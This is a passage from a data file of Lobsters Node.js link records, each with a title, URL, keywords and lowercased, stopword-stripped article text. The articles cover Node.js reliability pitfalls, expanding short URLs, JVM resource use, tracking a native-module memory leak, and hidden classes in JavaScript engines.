reason use new relic two default view average bad way represent realworld data dig past default view get reasonable chart like percentile get comfortable add chart custom dashboard understand use cluster one machine manually submit data like event loop latency number toobusyjs one data point per second win entire server even four worker process learned well memory emotional event retained clarity detail thus situation nicely seared brain remember quite well maybe imagine struggle help amazingly initial outline post started twice many situation worth mentioning well lot nodejs specific watch post like one
299,Lobsters,nodejs,Node.js programming,Node-RED: Flow-based programming for the Internet of Things,https://nodered.org/,nodered flowbased programming internet thing,built nodejs,built nodejs lightweight runtime built nodejs taking full advantage eventdriven nonblocking model make ideal run edge network lowcost hardware raspberry pi well cloud module node package repository easy extend range palette node add new capability
300,Lobsters,nodejs,Node.js programming,A library for building cross-platform apps - ReactXP,https://microsoft.github.io/reactxp/,library building crossplatform apps reactxp,,author react use phrase learn write anywhere react react native web app share logic io android apps view layer need implemented separately platform taken step developed thin crossplatform layer call reactxp write app abstraction share view definition style animation across multiple target platform course still provide platformspecific ui variant done selectively desired reactxp designed crossplatform development mind general expose apis component prop style animation parameter implemented consistent way across react j html react native io android platformspecific prop style attribute exposed tried keep minimum reactxp meant lightweight possible core component apis limited functionality required almost application extension reactxp expose specialized functionality similar crossplatform manner
301,Lobsters,nodejs,Node.js programming,FullStack Bulletin — a weekly newsletter for the ambitious FullStack developer,https://fullstackbulletin.com/,fullstack bulletin weekly newsletter ambitious fullstack developer,andrea mangano,andrea manganouiweb developer food lover romantic visionary man curious life
302,Lobsters,nodejs,Node.js programming,Unshorten (expand) short URLs with Node.js,http://loige.co/unshorten-expand-short-urls-with-node-js/,unshorten expand short url nodejs,bitly googl yourls rebrandly short url work resolving short url get get resolving short url nodejs module promisebased dependency free nodejs library expanding short url official repository bonus resolving short url curl extracting data wikipedia using curl grep cut shell command recap,short url invaluable tool social medium marketing many year used seeing everywhere credit probably go url shortener service like bitly googl yourls rebrandly popularised concept made easy everyone start creating short url working url automation scenario like analytics information crawling data retrieval etc important resolve unshorten expand short url mean retrieving original long url article going see short url work expand original url short url work short url regular url time result short following simple format shorter domain id often called also slashtag shorter course url eg http loigelinkb happens behind scene url shortener service big database table contains map existing short url related fulllength url url shortener service lookup table might look like following domain id url loigelink b http wwwnodejsdesignpatternscom loigelink gh http githubcomlmammino rebrandly lucianotw http twittercomloige note example table support multiple domain pair domainid must unique table url shortener expose web server reached domain mapped fact url shortener service like rebrandly support different domain even possibility associate branded domain every request satisfies short url format domain id extracted query executed database search corresponding long url finally match found web server responds redirect message sending browser user corresponding long url resolving short url url shortener need talk browser work web server adopting http standard following diagram illustrates http protocol used user click short url user click short url browser issue get request url request hit short url service server executes lookup database find associated long url long url returned redirect response user browser mean http moved permanently response using header location specify new long url browser automatically follows redirect response issuing new get request long url displaying content url user happens user browser deal short url everything happens behind scene user even notice exchange short url server simple enough right resolving short url nodejs know short url service work hard create nodejs script capable resolving type short url var request require request var uri http request uri uri followredirect false function err httpresponse err return consoleerror err consolelog httpresponseheaderslocation uri simplicity script using request module perform http request default library follows redirects need explicitly disable behaviour specifying option followredirect false opportunity catch redirect response callback read location header represent expanded url case dealing short url script print back original url passed function promisebased dependency free nodejs library expanding short url easily adapt code work specific use case want readymade easy use urlunshortener npm library trust library recently published called tall tall dependencyfree promisebased library allows easily resolve short url get corresponding long url understand easy use tall check sample usage import tall tall tall http unshortenedurl consolelog tall url unshortenedurl catch err consoleerror aaaw err example available official repository bonus resolving short url curl course also use evergreen curl issue http request short url read location header retrieve long url curl head http output something like see location header report long url bash unix lover probably already thinking pipe output grep unix command line tool extract long url full output curious kind approach read similar article previously wrote titled extracting data wikipedia using curl grep cut shell command recap simple article learned short url service work thus use programmatic way need know associated long url hope interesting fun reading article code example usual love opinion know plan use knowledge tall library one next project feel welcome let know comment see next time
306,Lobsters,nodejs,Node.js programming,The dangerous cliffs of Node.js,https://blog.scottnonnenberg.com/the-dangerous-cliffs-of-node-js/,dangerous cliff nodejs,talk based post seattle nodejs meetup screencast slide demo github nodejs crash event loop asynchronous callback crash immediately take entire process socket hangups mitigation hang requested session data redis promise however get bad state mitigation highresolution timer output duration dash builtin route timeout option blocking event loop callback call dropped mitigation learn use effectively limit new relic much concurrency jsonstream backpressure mitigation circuit breaker pattern node implementation exponential backoff fast node process lot server trying connect database went take production firewall saying getting summit defense depth,update july gave talk based post seattle nodejs meetup screencast slide demo github rose world nodejs fact every platform used feel like precarious mountain path long cliff yes feature beautiful vista one wrong step let cover four simple mistake substantial unexpected consequence well potential guardrail crash simplest mistake classic crash code done many time easy try get key null object try call string like function crashed var x xgetdata var yleft difference nodejs event loop ask file disk provided callback called directly system future turn event loop crash callback immediately take entire process say asynchronous callback crash immediately take entire process ah brings back core dump got time writing general approach world nodejs let process crash restart apps like forever nodemon oslevel system like upstart runit systemd etc maybe capture error callstack via processon uncaughtexception report somewhere feel bit weird first especially used standard application server approach catching error serving error page moving sadly even quick restarts result socket hangups client worst case multistage async operation progress even result corrupt inconsistent data else expect immediately take process mitigation hang last november one nodejs apps started taking really long time respond responding minute expecting far le second first looked application log app node slow request coming found response took longer m confused looked load balancer log discovered app node actually served response saw second one tried second load balancer timeout poking problematic first app node discovered node process hanging requested session data redis node really really good lot async operation parallel promise library like async help kick several something complete happens one async call never return rail example page take long gather data render error raised nodejs world look like user cancelled request happily lot library timeouts return error kind case superagent request return timeout error even underlying web request never return redis however get bad state hang async request sure listen error end event redis client object perfect example need understand dependency well even fully vetted thirdparty library still easy cause forgetting ressend next call somewhere even easier multibranch async method forgetting call callback infrequentlyhit branch mitigation monitor nginx log hang notification default errorspecific log file look like upstream timed connection timed install express logging use morgan express logger installs highresolution timer access via responsetime token found hang output duration dash also mean user cancelled action either way lot dash responsetime bad sign hapi seem output anything log hang even goodconsole plugin place even detecting situation think agree want user waiting long finally get response default express hapi keep connection open remote client give seen chrome something like two minute nginx second default hapi builtin route timeout option want investigate express little trickier use middleware like timeout need watch longrunning handler attempting send response timeout error already sent client writing server interacting client embrace logging way catch hang scenario detecting missing log entry blocking event loop first nodejs app backed site heavy clientside interactivity delivered required data three big chunk data went back far year enable interactivity wanted chart data built every day adding size thing seem snappy data flying around became clear getting data data store transforming sending client took long enough slow event loop event loop rapidly processing many small task nodejs process healthy keep mind implement standard web application endpoint validate incoming request user parameter make request data database transform slightly send back client could wrong well database query include kind limit could get order magnitude record expected transformation step would take couple millisecond data transformation time process unresponsive request callback setinterval call dropped even inprogress response would take couple millisecond need wait turn singlethreaded event loop every inflight request wait time added response time user see delay one requested large data set mitigation prefer stream stream way handle large amount data without taking process put time learn use effectively must get data front sure include kind limit clause check userprovided bound input monitor request response time new relic plug express automatically use morgan support response time goodconsole plugin hapi includes response time default one toolong synchronous code block delay everything else see clear pattern data much concurrency last contract needed write program process gigabyte json data transforming injecting database happily jsonstream assist handling data little bit time certainly load memory implemented short order started first run working json processing little bit faster import database memory usage increased database import fell behind solution periodically call streampause wait outstanding database import call call streamresume key application backpressure program free rip data minute constant memory usage nodejs really good kicking lot concurrent task like anything good think longterm addition short term otherwise really easy get state bitten chew worse perhaps fine service depend starting buckle pressure application highlyconcurrent onslaught mitigation use something like toobusyjs monitor event loop latency basic detect slow event loop sign high load long synchronous processing also use turn away request high latency avoiding runaway failure incoming request add load alreadystruggling process limit number concurrent request make downstream service polite especially service make sure wellread agent keepalive socket impolite slow close reopen lot socket need downstream service know failure mode third party service really well might consider using circuit breaker pattern node implementation failure case consider using exponential backoff nodejs also good retrying thing quickly fast node process lot server trying connect database went take production firewall saying getting summit course testing first line defense prevent thing production service need resiliency mitigation defense depth technique issue get production effect minimized place service humming along production relax bit maybe even enjoy view
307,Lobsters,nodejs,Node.js programming,Protecting APIs from the DDoS attacks by signing the resource identifiers,https://hackernoon.com/protecting-apis-from-the-ddos-attacks-by-signing-the-pks-c1eca7cc7725,protecting apis ddos attack signing resource identifier,,
308,Lobsters,nodejs,Node.js programming,The JVM is not that heavy,https://www.opensourcery.co.za/2017/01/05/the-jvm-is-not-that-heavy/,jvm heavy,za tech monologue slack background rubyfuza charles nutter open pull request fast forward jozirb react rail reframe weigh upfront cost really high running jvm heavy fastest runtimes disk usage heavy deploying heavy day day jvm datomic joy repl figwheel conclusion go learn simple made easy,mostly opposition clojure jvm sh heavy came za tech slack team several week ago watching clojure talk holiday speaker also noted objection bit monologue slack penning broader consumption discussion background used think jvm heavy way back early compared php heavy alternative like net coldfusion lighter alternative like perl python window back activeperl activepython also bit heavy first got fear jvm deployed little production app jruby heroku little beast perform single daily task generated bunch pdf uploaded isign defunct storage sharing isign classic rail app hosted ami little dyno running stock jvm except server produced pdf fast basically killed node cluster every run still thought bit heavy use love ugly duckling le followed jruby development success story fantastic time rubyfuza charles nutter felt inspired afterwards went mission open pull request ruby project simply run test jruby stopped one bad fast forward tried building rail app scratch november first time month attempted ruby programming machine brew upgrade bumped rbenv thus threw away ruby installs nt even notice going present websockets jozirb starting point play react rail repo get feel using react rail using reframe month confident pull raw react wheel came spectacularly clone run one sample app needed upgrade xcode upgrade command line tool xcode total install new ruby version bundler bundle install sample app simple right sample app like majority rail apps depends somewhere dependency graph alone size whole exercise took hour playing impressive demo realized bringing hcmb game rockpaperscissors decided build frontend ember instead since know ember running time thing need update nvm install respectable node version install embercli generate app install dependency via npm bower played little gave instead shared experience handful folk came humbling truly humbling felt like stranger world part long back statement jvm heavy weigh size jdk download use lot resource run library consume lot disk space ceremonial affair deploy slow day day question help cut emotional barrier thinking jvm emotion bias costly hurt u long run let tackle see lie beneath upfront cost really high heaviness jvm pure fud start largeish upfront cost installing compare download jdk download node ruby baseline node ruby need c compiler system hundred megabyte alone even worse probably need compiler production amount bloat required node ruby hidden away small incremental step stop take stock mention time spent see way efficient nt even want go path assembling webpack config overthrown next new tool arrives running jvm heavy jvm fast probably one fastest runtimes keep getting faster leaner time thousand smartest engineer working make better even contributed last year real thread support multiple core configured hell back left alone useful thing probably need know set memory jvm work magic within constraint environment deploying heroku java server beastjar nt suffice probably income pay someone advice oh stackoverflow key thing charles people jruby community keep pushing without anything apps surely get faster faster jvm release independent jruby progress disk usage heavy curious looked folder turn month clojure development accumulated dependency even gigabyte yet du sh ruby install fresh basically requirement blog middleman working fix yep run static blog contribute tool power requires nearly storage node ember docpad bower installed deploying heavy probably predict going build step produce single jar file everything need app running somewhere else simply place jar need let jvm loose requirement deploy application massive application server easily bundle performant http server right jar file node folk ruby folk yet somehow jar file ca nt stand used think one relieved run aptget install buildessentials production box day day jvm run least jvm process macbook pro memory day every day would never tried start rail apps time two datomic transactor console one backend api one whichever frontend working sometimes automated test running background sure macos memory compression definitely help since good chunk jvm process byte loaded memory told month ago would would laughed right mind run jvm process go limb say definitely one oh class path crazy thing nt needed touch thanks great tooling provided clojure reason use npm bundler nt fiddle include path could probably different problem seeing joy repl stop start jvm instance continuously would definitely loose mind bothered jruby lot back day luckily clojure amazing repl need restart jvm instance rare case borked something badly rather idiot proof figwheel run day without issue conclusion careful judging jvm target judge java language mean keep separate virtual machine used believe thing used think jvm behemoth thankful able throw parenthesis work thousand giant support mean take post sign end node end ruby let bring fresh perspective ca nt switch jvm least think could help eliminate bloat world thanks giving privilege time go learn clojure experience simple made easy
310,Lobsters,nodejs,Node.js programming,Tiny Guide to Non Fancy Node,https://github.com/yoshuawuyts/tiny-guide-to-non-fancy-node,tiny guide non fancy node,tiny guide non fancy node introduction obviously people different opinion cool found work year fine disagree might chance find work programming style style there syntax standard language version require unstable wont matter function different type function async consider naming splitting ferossrun maplimit mississippi testing test anything protocol tap tape tap nyc dependencycheck greenkeeper functional utility toolbelts database level membdb subleveldown check wiki module devops lilpids taconginx distributed system hypercore hyperdrive apis merry static typing unassertify jsonschema protocolbuffers frontend choo use bankai browserify budo sheetify tachyons account authentication like township native development electron wrapping lebron stack license mit,tiny guide non fancy node tiny guide non fancy highvalue nodejs thing folk want build fun thing rather spending time fighting tool introduction nodejs truly neat piece software one largest programming community somehow low barrier entry high skill cap picking node hammer programming toolbox bad choice node little overwhelming though low barrier entry writing publishing software sometimes become hard find exactly need tiny guide exists little set opinion help guide vast world node obviously people different opinion cool found work year fine disagree might chance find work disclaimer disagree enough get angry guide urge take breath step back reconsider feel free write guide hell perspective resource great thing remember kindness matter programming style style syntax generally discussion punctuation linting thing boring use standard worry solving actual problem instead standard fix even take care formatting code around generally get job done language version generally need really yup really array method nice template string useful var performant flexible callback unifying interface asynchronous programming forloops fast get using tiny subset language make code stable readable predictable exactly way like require nt bother import unstable require worked since dawn node work reliably scenario come need worry tree shaking dead code elimination unless got extremely complicated application wo nt matter point probably much larger problem worry function nt need different type function using function foo cover base yup even arrow function nt worth aim boring removing argument arrow function make arrow function weird hard debug async callback ticket fast easy reason easy debug ever find struggling consider naming splitting paradigm build top callback probably make thing complicated example ignoring error handling example swallowing error together far worse want error predictable speaking error use throw crash burn program eg programmer error example wrong type use callback expected error eg oops wrong input try ferossrun family package truly wonderful give virtually need working callback efficiently also maplimit goto hammer needing run array thing series parallel something ever need composable async node consider using stream api nt pretty worth learning stream passed around synchronously send data one place another ideal creating composable reusable apis check mississippi github learn good stream package testing test anything protocol tap existed year work almost every language tape way use node nt worry fancy promise based parallel test runner provide measurable performance improvement code probably complicated first place instead consider removing io test example want pretty printing tap use tap want code coverage reporting use nyc use dependencycheck make sure nt miss deps greenkeeper neat maintain application functional utility toolbelts grab bag package often lead code creep nt use em function exposed given package chance given enough time code base asymptotically start using higher percentage function good thing dependent external code database level database use membdb testing developing use subleveldown split database check wiki module one virtually anything could need replication caching lru etc fan database usually peer dependency building something probably want optimize iteration much thing level excels unless building bank would nt trust build boring money transaction system node take advice people planning stuff like devops use lilpids process management taconginx expose process outside world scp npm generally enough deploy stuff use npm install npm start apps predictable probably nt need docker remember node cross platform virtual machine already get started node probably need always get fancy later distributed system probably nt need high performance distributed system stuff writing application ask really need run one machine stuff working day job though often turn problem distributed problem need run something multiple machine though eg live video streaming consider using hypercore distributed stream hyperdrive distributed filesystem neat secure module make writing distributed system stuff relatively painless apis recently working merry us stream fast logging load convention opinion around api design turned code static typing generally good idea validate assumption make help catch mistake early make fixing easier later like using node builtin assert package got input type want validate assert expect certain config value exist assert use package extra compile check static type nt make sense deploying production code unassertify remove extra check building apis jsonschema great way validate assumption made incoming json building custom wire protocol protocolbuffers similar great frontend recently working choo us pure html j clean architecture opinion around frontend application turned code serve frontend code use bankai based browserify super stable tool build frontend stuff boring stable name game budo similar bankai maybe like cs sheetify tachyons sheetify allows require cs nodemodules built right bankai easy work tachyons sane cs system might feel awkward first get past bump building maintainable website faster ever account authentication like currently working easy setup account stuff township still work progress anything scratched itch already using native development electron cool never built mobile app ca nt comment probably building website would start though wrapping yup boring tool writing software obviously much tool discovered npm friend hope little guide least help little getting started wonderous world node p fancy name tech described guide lebron stack nt kid happy coding license mit
314,Lobsters,nodejs,Node.js programming,This is unfortunate and we're stuck with it forever,https://facundoolano.wordpress.com/2016/12/09/this-is-unfortunate-and-were-stuck-with-it-forever/,unfortunate stuck forever,nodeconf argentina mathias bynens ii iii iv v vi vii like,week ago nodeconf argentina mathias bynens gave presentation regexp unicode javascript point showed series example yielded counterintuitive result said unfortunate stuck forever phrase immediately resounded head perfect definition javascript least current state javascript ii douglas crockford published javascript good part eight year ago masterpiece lot takeaway javascript loaded crap bad awful part great functional language somewhere striving get sometimes lot time le book perfect example page long mostly filled snippet example still clearer purpose communicated effectively computer book make better language javascript subsetting iii javascript ecosystem evolving constantly last year imagine mutated faster programming language done lot change genuinely good addition make life easier pleasant javascript whole getting better iv unlike language javascript run browser control runtime browser want older browser support new code new browser support old code break backwards compatibility add stuff language take stuff bad awful part still javascript like train wreck nose job v always wonder like learn javascript new programmer programmer coming language tell var stick let const one preferred preferred one default always prepend operator define variable yes instruct linter forbid keyword especially compilerinterpreter make interpreter assume const declaration default vi really way break backwards compatibility stick flag somewhere script language javascriptgood use noncrappy mind adding use strict every file honestly forgot browser manage multiple version javascript worth save especially uneven language crawled way server desktop vii know must excellent reason break backwards compatibility javascript would expensive help mind syntaxorientedprogrammerwithaninclinationtoalessismorekindofthinkingtypeofmind help imagining would go subsetting language would design javascript help outlining spec imaginary language head even came name unsurprisingly already taken like like loading related
315,Lobsters,nodejs,Node.js programming,Peeqo - The GIF Bot,http://imgur.com/gallery/ue4Ax,peeqo gif bot,javascript disabled browser enable j,seeing message mean javascript disabled browser please enable j make imgur work
316,Lobsters,nodejs,Node.js programming,A curious case of memory leak in a node.js app,https://www.future-processing.pl/blog/a-curious-case-of-memory-leak-in-a-node-js-app/,curious case memory leak nodejs app,bug hunt nodeinspector valgrind memcheck still reachable definitely lost indirectly lost possibly lost memcheck manual gyp documentation revelation nodeodbc previous post resolution pull request afterword,story bug opportunity fix ancient time nodejs new shiny nodejs still glimmering somewhere horizon still young beautiful u least let take adventure time space hopefully learning involved along way hop magic school bus bug started usual bug report performance team noticed repeating pattern one application developing sizeable distributed system slow linear increase memory consumption worker process followed imminent crash one worker critical issue seems though performance testing environment set determining maximum load system could handle meant application processing constant load request far exceeding projected peak load production system day time weeklong test application would several worker died due found memory leak instantly brought back data processing resumed nothing got lost drop performance split second one worker hardly noticeable overall impact system minimal anyhow started investigating hunt immediately faced problem took several hour processing computer much powerful developer pc leak become apparent slowed u significantly chance actually reproduce application crashing instead settled running data processing hour two time task meantime returning analyse result sometimes left processing overnight hoping find something new morning exactly look started small nodeinspector chrome developer tool implementation nodejs time nodeinspector godsend allowing u easily debug application also capture cpu profile heap snapshot running application analysis lot time passed since similar feature introduced nodejs starting version use inspect flag enable digress last feature heap snapshot exactly focused week going cycle running test data application generating heap snapshot sifting result finding nothing peculiar going back start rinse repeat dismay attempt yielded result reported heap size consistently staying megabyte range may seem consistent comparing memory usage process dying performance environment around gigabyte started become glaringly obvious looking wrong place unfortunately spent quite lot time single bug already considering fact production environment single crash chance occur day maybe even week priority issue quickly decreased still stage functionality missing incomplete particular issue put back burner even though issue deemed insignificant perspective project success stuck u developer like splinter feel ohsoclose pull quite grab time even notice notice stop bothering like splinter bug remained mind wonder returned periodically course next month pressure temporarily subsided time look le important issue returning clear mind tried different approach depended numerous native module built nodegyp growing suspicion memory leak might created u also even hidden javascript code result bug c code one dependency instead reason decided pull big gun specific big gun valgrind know valgrind framework building tool analysing application runtime one commonly used tool shipped valgrind memcheck getting much detail might able provide reliably anyway memcheck modus operandi replacing dynamic memory allocationdeallocation c function malloc calloc realloc free implementation allowing track dynamic memory usage within program turn allows detecting range common problem memory access program outofbounds array access reading free guessed memory leak however power come price problem big gun encumbered many big thing move slowly slowly fact running application memcheck cause slowdown average factor bad case terrible u slowdown meant whatever managed process within hour little would take full day maybe option sight gave shot anyway delve deeper would make sense mention exactly find memcheck report make sure get firstly like focus category allocated memory block get divided got four namely still reachable nonconcerning kind memcheck certain variable code hold address memory block could freed program exit definitely lost opposite previous one pointer allow access given memory block way call free definitely call fix code indirectly lost one bit le straightforward involves data structure containing pointer example created linked list lost pointer first element list would make first element list definitely lost remaining element indirectly lost even though pointer memory block allocated element exist preceding item still way actually reach outside would likely fixed simply fixing error caused initial block marked definitely lost possibly another category straightforward relies notion interior pointer interior pointer basically pointer instead holding address start allocated block hold address somewhere middle block multiple reason may case many valid one reason may using data structure utilising first byte block hold information size block internally convenience else referenced using pointer skipping size data pointer detected pointer chain leading memory block marked possibly lost memcheck way knowing whether offset pointer intended appeared result error case require human insight determine whether corrected basic rundown detail indepth explanation like refer memcheck manual making report memcheck kind enough let know memory leak also tell exact line code leaky memory allocated course provided binary running contains debug symbol likely case nodejs native package thus start debugging session make sure look nodemodules directory find bindinggyp file within modify include compiler flag enabling debug symbol generation g case gcc appropriate cflags array detail located within file available gyp documentation official way building debug release nodegyp would installing nodegyp command available calling nodegyp build debug directory native module digging code replace release debug require call load compiled module much hassle ask approach modify bindinggyp file call npm rebuild directory fewer change nothing set done load nodejs application memcheck generated report contain filename line number affected cc file time return back story armed new weapon hoping breakthrough mean memory leak show javascript heap dump leaky code c side thing surely case exactly call shirley true find definitely lost memory block one dependency point overjoyed even though size block mere hundred byte seemed u might found culprit part code executed batch processed data even though leak marginal took consideration short span test coupled slowdown introduced memcheck limited processing power comparison much beefier performance environment advanced technique guesstimation arrived conclusion particular bug source whole problem within realm possibility quickly forked library fixed issue pushed fix private npm repository quickly reran memcheck confirm bug gone asked performance team run test next day came eagerly waiting test result come ready pat back job well done probably guess result le desirable fact even sure anything changed fact particular fix work left u disappointed realisation completely clueless go soon enough important task appeared forced leave issue elusive memory leak unresolved even time passed one colleague decided another go problem clear mind strong conviction must missing something obvious tried retrace step started nodeinspector day two decided share heap dump could look well something never done every single time analysed heap dump without bothering export file noticed something peculiar revelation even though heap size reported within devtools roughly across file received smallest merely megabyte size largest well hundred odd could case might ask untold mystery hide within file good question asked point became obvious thing chrome devtools hiding u time trusting tool anymore decided peek inside file text editor allowed discover generated snapshot nothing json document structure fairly easy work even without parser three main part heap dump node edge string array node various type entity kept memory object string number compiled regular expression also example closure edge connection exist node node edge stored onedimensional array number convenience file come line break separating node edge also humanreadable description field representation mean talk developerfriendly let look found inside shall purpose using heap dump download generated minute running minimal program reproduced issue first thing noticed staggering total number edge comparison total number node total originated single node line file see interesting field second third last one name id node outgoing edge count name index string string array read handle scope scrolling file inevitably stumble upon unmissable closetofour million repeated line reading important field u second third name id target node name index string array reading undefinedvalue surprise surprise node id file meant application reason kept million upon million handle undefined discovered could think moment huh well weird suddenly eye opened bit wider thought wait reminds something sparked mind see point strong suspicion database connectivity module choice nodeodbc offender reason similar leaky behaviour already observed application pronounced since number database query generated much lower first application problem discovered started believe size memory leak somehow proportional number quickly found c file read code many time trying find something could potentially cause memory leak knew look would good moment explain bit managing javascript scope work c api let use simple example void examplefunction handlescope scope local integer value integer new isolate getcurrent start function created new instance handlescope created new handle scope pushed top scope stack point handle created within scope object referenced local persistent handle example create local handle new integer object containing value next examplefunction end cause scope variable go scope c function trigger destructor scope object removing scope stack removing local handle created within scope object local handle removed marked removal garbage collector prevented creating persistent handle instead side note prepared simple animation showcase behaviour snippet modify function bit make return handle object way ensures object get marked gc local integer returningfunction escapablehandlescope scope local integer zerovalue integer new isolate getcurrent local integer onevalue integer new isolate getcurrent return scopeescape onevalue scopeescape creates new local handle handle scope one step current scope stack copy value handle given parameter newly created one thus ensuring referenced object still accessible given example object referenced zerovalue handle marked gc returningfunction object referenced onevalue handle create persistent handle instead return function without scopeescape might ask remember make sure dispose manually somewhere else code obviously errorprone way handle created scopeescape properly deleted scope created within disposed let take look animation presenting behaviour code one part puzzle another thing need explanation nodejs allows make synchronous blocking c code seem asynchronous already talked detail previous post keep explanation brief let say achieve run code expect blocking longer period time separate thread finish job result passed another function provided run main thread next cycle j event loop staring several scopeclose undefined example using current version api escape called back undefined simply returned handle undefined inside callback function asynchronous task wondering truly reason observed behaviour confirm edited method querying database actual work instead starting job separate thread nothing particular well returning callback function main thread would create close scope also added global variable would increment printf call function triggering threaded execution could compare number reported edge count coming handle scope heap dump followed creation script already mentioned analysed heap dump simply created connection database ran gutted querying function loop let counter reach several million take long memory usage ballooned generated heap snapshot immediately killed application right opened generated file looked number edge coming handle scope compared last reported value counter bob uncle almost moment knew found left fixed issue figuring resolution certainly many familiar rubber duck debugging technique time read particular bit code many time certain obvious different time seen scope closed hundred time knew never occurred question day see three function used sake asynchronous code javascript one called javascript triggering execution separate thread one running blocking code thread one collecting result invoking javascript callback result first last one running within context looking j side even though pas callback asynchronous function still return something synchronously would thing returned scopeescape first c function however despite invoking javascript callback also handle undefined returned synchronously last c function begs question handle go key created likely global handle scope life throughout entire lifetime nodejs application third c function callback result thread executed top call stack original function triggered processing instead brand new call stack created starting function currently mean concept closingescaping scope returning data synchronously really make sense nothing could make use anything return realised removed scopeclose undefined expression c callback function rebuilt package ran test program poof multiplying handle leaking memory performance test using fixed version library confirmed result next day submitted pull request official repository finally closing issue afterword bug among enjoyable opportunity approach frustrating time attempt fixing thwarted offered many chance use new tool learn lot inner working nodejs general also provided unmatched satisfaction able finally get closure nearly month live back mind hope learned something new useful today least enjoyed story similar story maybe like know bit anything mentioned post please let know comment
317,Lobsters,nodejs,Node.js programming,JavaScript Engines Hidden Classes,https://vhf.github.io/blog/2016/11/28/javascript-engines-hidden-classes/,javascript engine hidden class,describes property oo world property access douglas crockford notation ordinary javascript object exotic object property access problem dynamic lookup slow ordinary exotic object behaviour get prototype chain property access solution hidden class despite self lack class compensate absence class system us implementationlevel transparently group object cloned prototype c chamber ungar e lee efficient implementation self dynamicallytyped objectoriented language based prototype september map object javascriptcore type nicholas nethercote design reference mott,lead engineer lars describes design decision first thing talk hidden class better understand hidden class need know problem solve article first introduction concept cover fast property access something hidden class make possible explain hidden class come tell observe natural habitat chromium provides u awesome microscope say thing inline caching well using hidden class lead big performance boost show keeping mind improve javascript performance eg avoiding property deletion polymorphic property oo world classbased objectoriented language c java c add delete method property object fly accessing property generally costly store object property fixed memory offset object layout instance given class never case accessing property often done single instruction load thing located given memory offset imaginary java virtual machine java object could stored memory simple structure exact instance class property attribute method either primitive java type int float pointer array function structure nt hold whole object data merely hold reference memory offset real data stored another jvm could object could stored three simple pointer first one class object representing type object second one table holding pointer object method third one memory allocated object data point noticed mainly talking strategy store object memory access property call property access mean retrieving value object property mechanism use time leverage javascript const f x parseint x may know javascript prototypebased classfree classbased object mutable javascript augment new instance giving new field method act prototype even newer object nt need class make lot similar object douglas crockford object created cloning existing prototype also created using literal notation initializer notation easily modify fly important part running javascript code creating object putting memory retrieving retrieving property focus ordinary javascript object opposed exotic object discus property access technique property access problem dynamic lookup slow let get back topic implement property access looking ecmascript specification proposes good starting point section ordinary exotic object behaviour get describes following algorithm simplified purpose article obj prop objprop make sure typeof prop either string symbol obj fact obj prop direct property obj obj prop undefined return obj prop end prop direct property obj obj prop undefined let parent obj prototype b using parent instead obj c parent null return undefined end go prototype chain go back parent instead obj mean retry procedure parent prop called dynamic lookup lookup dynamic runtime try find prop obj fail try prototype prototype prototype etc could implement big dictionary associative array would store object used program key would reference object value would turn dictionary property key value function point x thisx x thisy const new point const new point const new point const lit name bond const allobjects proto x proto x proto x proto name bond implemented javascript give basic idea could store object used javascript program using dictionary dictionary would probably implemented hash table let say want get first object created program hence reference let roughly follow algorithm took ecmascript spec find allobjects lookup resolve object location memory find property named z dynamic lookup resolve property location memory return value tried could stopped returning since property named z fetch see property named z otherwise look property named z repeat process prototype chain proto null mean object prototype found probably guess process efficient property access solution hidden class instead resorting dynamic lookup access property implement hidden class concept originally present another prototypebased programming language self quote abstract paper first described idea emphasis mine self implementation run twice fast fastest smalltalk implementation despite self lack class explicit variable compensate absence class system us implementationlevel map transparently group object cloned prototype c chamber ungar e lee efficient implementation self dynamicallytyped objectoriented language based prototype sigplan september hidden class better explicit name paper call map make reference self avoids confusion map data structure javascript implementation map object although fact really named map short vocabulary brief prove handy start digging mostly stick hidden class terminology nt surprised drop map variety modern javascript engine use today implement similar approach hidden class variant safari javascriptcore structure microsoft edge chakracore type firefox spidermonkey shape number data structure within spidermonkey dedicated making object property access fast important shape shape linked linear sequence called shape lineage describe object layout shape lineage shared live property tree shape lineage unshared belong single j object dictionary mode nicholas nethercote everyone seems use variant hidden class look like generated let take look point function function point x thisx x thisy const new point const new point const new point const new point read hidden class map could expect engine create map point soon assigns reuse map quite fact looking related different map although part well illustrated design reference documentation nt updated almost year worth paraphrasing let start first part code define function point use constructor many point two parameter x object remember argument pas point constructor function point x thisx x thisy point time put function memory nt really care point happens create point const new point see first usage point function constructor create new object based point prototype nt yet know point really look like know function point creates initial version hidden class need first hidden class represents point object without property time allocates variable memory object containing nothing class pointer store fact hidden class entering point function argument next thing encounter thisx x resolve thisx aha point property called x property part map first thing first put memory object first memory offset spot data contained object stored call offset creates new hidden class based brings table reference property named x data stored object offset modifies tell time object hidden class get property named x added object transition using instead hidden class next line thisy ie thisy happens internally first stored next memory offset offset new hidden class created cloning say cloning point reference property named x data offset receives additional ability property named data found object offset capable hidden class transition plan updated tell object transition using get property named set might seem bit schematic probably wondering could observe behaviour fortunately chrome developer tool allows u kudos team exposing hidden class end user someone mozilla told considered adding capability developer tool nobody implemented yet want play along open tab google chrome chromium fire devtools open devtools setting focus devtools hit enable show advanced heap snapshot property profiler section preference tab close setting go console copy following code evaluate function point x thisx x thisy const new point const new point const new point profile tab select take heap snapshot hit take snapshot button done couple mb data collected use class filter box filter object type point name function able see three point created uncollapsed object property see basic get u started point object id prototype point way next one proto id object prototype see three point prototype id note preview object hovering id eg remember said internally hidden class named map yep looking exciting point map system map hidden class uncollapse map backpointer system map backpointer system map transition system point map system map hidden class ie point map system map hidden class ie lars bak spent last year implementing optimizing virtual machine worked self strongtalk hotspot dart vms best part come previous experience self similar javascript prototypebased oo language came inline caching inlining deoptimization learned strongtalk became big part hotspot success heavily influenced jit dart came inspired smalltalk javascript c erlang vm kept best part self strongtalk hotspot notice name hotspot come ability profile bytecode runtime target hot spot frequently executed part code eg hot function hot code optimization like initial plan got lost way draft blog post sitting hard drive since february might publish followup someday edited incorrectly compared java smalltalk smalltalk possible add method property object instantiated class pointed mott comment introduces relevant distinction compiletime class inheritance runtime class inheritance
318,Lobsters,nodejs,Node.js programming,Winds 0.2,https://github.com/GetStream/Winds/releases/tag/v0.2.0,wind,reload reload,updated url pattern regex adding feed dialog fix perform action time signed another tab window reload refresh session signed another tab window reload refresh session
